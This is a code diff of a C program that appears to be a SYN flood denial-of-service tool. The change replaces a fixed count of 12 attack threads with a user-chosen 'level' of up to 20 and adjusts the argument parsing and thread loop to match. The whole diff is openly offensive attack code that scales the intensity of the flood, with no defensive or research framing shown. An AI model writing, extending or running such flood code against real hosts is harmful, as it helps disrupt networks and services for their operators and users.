@@ -1,6 +1,6 @@
 #include "protocol.h"
 
-#define TH_N 12
+#define MAX_TH_N 20
 
 struct thread_arg
 {
@@ -14,10 +14,11 @@ int attack(int sock, struct sockaddr_in *addr);
 void *synflood_thread_function(void *p);
 
 int syn_flood(int argc, ...) {
-    struct thread_arg th_arg[TH_N];
-    pthread_t thread_id[TH_N];
+    struct thread_arg th_arg[MAX_TH_N];
+    pthread_t thread_id[MAX_TH_N];
     struct sockaddr_in t_addr;
     int sock;
+    int th_n;
     struct in_addr t_ip;
     int t_port;
     char *inputData, *ptr;
@@ -26,10 +27,17 @@ int syn_flood(int argc, ...) {
     srand((uint32_t)time(NULL));
     
     va_start(ap, argc);
-    
+    th_n = atoi(va_arg(ap, char*));
+
+    if(th_n>MAX_TH_N || th_n<=0)
+    {
+        printf("Level error\n");
+        return -1;
+    }
+
     switch(argc)
     {
-        case 1:
+        case 2:
             inputData = va_arg(ap, char*);
             va_end(ap);
             if(ptr=strchr(inputData,':'))
@@ -43,7 +51,7 @@ int syn_flood(int argc, ...) {
                 return -1;
             }
             break;
-        case 2:
+        case 3:
             inputData = va_arg(ap, char*);
             t_port = atoi(va_arg(ap, char *));
             va_end(ap);
@@ -68,7 +76,7 @@ int syn_flood(int argc, ...) {
     t_addr.sin_family = AF_INET;
 
     printf("%s:%d Syn flooding...\n",inet_ntoa(t_addr.sin_addr), t_port);
-    for(int n = 0 ; n<TH_N ; n++)
+    for(int n = 0 ; n<th_n ; n++)
     {
         th_arg[n].sock = make_socket();
         th_arg[n].t_addr = &t_addr;
